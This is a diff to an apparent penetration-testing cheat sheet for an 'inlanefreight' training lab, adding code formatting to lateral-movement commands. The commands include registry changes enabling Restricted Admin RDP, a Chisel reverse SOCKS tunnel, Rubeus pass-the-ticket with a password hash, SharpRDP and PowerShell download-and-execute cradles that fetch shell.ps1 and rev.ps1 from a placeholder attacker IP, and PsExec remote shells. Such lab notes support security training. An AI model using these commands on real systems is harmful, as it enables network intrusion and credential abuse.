@@ -9,46 +9,46 @@
 
 - Open Remote Desktop Connection client (Windows)
 
-	C:\> mstsc.exe 
+	`C:\> mstsc.exe` 
 
 - Open Remote Desktop Connection client in Restricted Admin mode 
 
 
-	C:\> mstsc.exe /restrictedAdmin 
+	`C:\> mstsc.exe /restrictedAdmin` 
 
 	
 
 - Query, Disable, and Enable DisableRestrictedAdmin value in LSA settings. 
 
 	
-	C:\> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin 
+	```C:\> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin 
 	
 	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD 
 	
-	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD 
+	C:\> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD``` 
 	
 
 - Chisel Server & Client. 
 
 	
-	$ ./chisel server --reverse --port 9999
+	```$ ./chisel server --reverse --port 9999
 	
-	C:\> chisel.exe client "ATTACK HOST":"PORT" R:socks
+	C:\> chisel.exe client "ATTACK HOST":"PORT" R:socks```
 	
 
 - Rubeus Pass the Ticket 
 
-	PS C:\> .\Rubeus.exe createnetonly /program:powershell.exe /show 
+	```PS C:\> .\Rubeus.exe createnetonly /program:powershell.exe /show 
 	
-	PS C:\> .\Rubeus.exe asktgt /user:"USER" /rc4:"HASH" /domain:targetdomain.local /ptt 
+	PS C:\> .\Rubeus.exe asktgt /user:"USER" /rc4:"HASH" /domain:targetdomain.local /ptt``` 
 	
 
 - Execute Powershell command on Windows Server using SharpRDP
 
 	
-	C:\> SharpRDP.exe computername=dc01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://"ATTACK-IP:PORT"/shell.ps1')" username=inlanefreight\"USER" password="PASS"
+	```C:\> SharpRDP.exe computername=dc01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://"ATTACK-IP:PORT"/shell.ps1')" username=inlanefreight\"USER" password="PASS"
 
-	PS C:\> IEX(IWR -Uri 'http://"ATTACK IP:PORT"/rev.ps1' -OutFile C:\>rev.ps1 -UseBasicParsing);C:\>rev.ps1 
+	PS C:\> IEX(IWR -Uri 'http://"ATTACK IP:PORT"/rev.ps1' -OutFile C:\>rev.ps1 -UseBasicParsing);C:\>rev.ps1``` 
 	
 
 ### SMB Commands
@@ -56,4 +56,4 @@
 
 - Execute command on remote server using PsExec
 
-	PS C:\> .\PsExec.exe \\DC01 -i -s -u INLANEFREIGHT\'USER' -p 'PASS' cmd
+	`PS C:\> .\PsExec.exe \\DC01 -i -s -u INLANEFREIGHT\'USER' -p 'PASS' cmd`
